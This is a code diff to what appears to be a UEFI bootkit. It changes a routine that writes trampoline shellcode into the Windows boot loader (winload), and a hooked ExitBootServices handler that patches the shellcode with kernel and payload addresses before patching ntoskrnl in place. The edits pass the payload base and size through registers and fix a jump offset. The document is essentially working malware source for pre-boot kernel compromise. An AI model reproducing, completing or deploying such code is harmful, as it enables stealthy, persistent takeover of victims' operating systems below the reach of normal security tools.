@@ -151,7 +151,20 @@ static EFI_STATUS PatchWinload(VOID *ImageBase, UINTN ImageSize)
             UINT8 *TrampolineSlot = (UINT8 *)ImageBase +
                 TextSection->VirtualAddress + TextSection->VirtualSize;
 
-            /* trampoline shellcode (position-independent) */
+            /*
+             * Trampoline shellcode (position-independent).
+             *
+             * Byte map (110 bytes total):
+             *   [0..22]    15x push (save all GPRs)         23 bytes
+             *   [23..32]   mov rax, <PayloadPhysical>       10 bytes  (imm64 @ 25)
+             *   [33..42]   mov rcx, <NtoskrnlBase>          10 bytes  (imm64 @ 35)
+             *   [43..52]   mov rdx, <NtoskrnlSize>          10 bytes  (imm64 @ 45)
+             *   [53..62]   mov r8,  <PayloadBase>           10 bytes  (imm64 @ 55)
+             *   [63..72]   mov r9,  <PayloadSize>           10 bytes  (imm64 @ 65)
+             *   [73..74]   call rax                          2 bytes
+             *   [75..97]   15x pop  (restore all GPRs)      23 bytes
+             *   [98..109]  mov rax, <ResumeStub>; jmp rax   12 bytes  (imm64 @ 100)
+             */
             UINT8 Trampoline[] = {
                 /* push all */
                 0x50,                                   /* push rax */
@@ -172,15 +185,23 @@ static EFI_STATUS PatchWinload(VOID *ImageBase, UINTN ImageSize)
 
                 /* mov rax, <payload_physical_address> */
                 0x48, 0xB8,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @25 */
 
                 /* mov rcx, <ntoskrnl_base> (filled at ExitBootServices) */
                 0x48, 0xB9,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @35 */
 
                 /* mov rdx, <ntoskrnl_size> */
                 0x48, 0xBA,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @45 */
+
+                /* mov r8, <payload_base_physical> */
+                0x49, 0xB8,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @55 */
+
+                /* mov r9, <payload_size> */
+                0x49, 0xB9,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @65 */
 
                 /* call rax */
                 0xFF, 0xD0,
@@ -202,9 +223,9 @@ static EFI_STATUS PatchWinload(VOID *ImageBase, UINTN ImageSize)
                 0x59,                                   /* pop rcx */
                 0x58,                                   /* pop rax */
 
-                /* jmp <original_kernel_entry> (filled later) */
+                /* jmp <resume_stub> (filled later) */
                 0x48, 0xB8,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   /* @100 */
                 0xFF, 0xE0                              /* jmp rax */
             };
 
@@ -271,8 +292,8 @@ static EFI_STATUS PatchWinload(VOID *ImageBase, UINTN ImageSize)
             ResumeStub[22] = 0xFF; ResumeStub[23] = 0xE0;
 
             /* fill trampoline's final jmp target → resume stub */
-            /* final jmp imm64 is at offset 80 in trampoline */
-            *(UINT64 *)(TrampolineSlot + 80) = (UINT64)ResumeStub;
+            /* final jmp imm64 is at offset 100 in trampoline (after r8/r9 adds) */
+            *(UINT64 *)(TrampolineSlot + 100) = (UINT64)ResumeStub;
         }
     }
 
@@ -427,6 +448,8 @@ static EFI_STATUS EFIAPI HookedExitBootServices(
     if (gCtx.NtoskrnlBase && gCtx.TrampolineSlot) {
         *(UINT64 *)(gCtx.TrampolineSlot + 35) = (UINT64)gCtx.NtoskrnlBase;
         *(UINT64 *)(gCtx.TrampolineSlot + 45) = (UINT64)gCtx.NtoskrnlSize;
+        *(UINT64 *)(gCtx.TrampolineSlot + 55) = (UINT64)gCtx.PayloadPhysical;
+        *(UINT64 *)(gCtx.TrampolineSlot + 65) = (UINT64)gCtx.PayloadSize;
     }
 
     /* patch ntoskrnl in-place if we found it */
